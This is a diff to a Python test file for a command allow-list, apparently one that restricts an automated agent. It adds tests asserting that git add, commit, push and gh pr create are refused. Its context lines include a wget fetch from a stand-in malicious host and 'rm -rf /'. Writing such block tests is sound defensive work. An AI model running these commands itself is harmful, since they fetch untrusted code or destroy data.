@@ -8,6 +8,22 @@ def test_banned_wget():
     dec = is_command_allowed("wget http://malicious.example.com/file")
     assert not dec.allowed
 
+def test_banned_git_add():
+    dec = is_command_allowed("git add .github/workflows/ci.yml")
+    assert not dec.allowed
+
+def test_banned_git_commit():
+    dec = is_command_allowed("git commit -m 'fix workflow'")
+    assert not dec.allowed
+
+def test_banned_git_push():
+    dec = is_command_allowed("git push origin main")
+    assert not dec.allowed
+
+def test_banned_gh_pr_create():
+    dec = is_command_allowed("gh pr create --fill")
+    assert not dec.allowed
+
 def test_banned_rm_rf_root():
     dec = is_command_allowed("rm -rf /")
     assert not dec.allowed
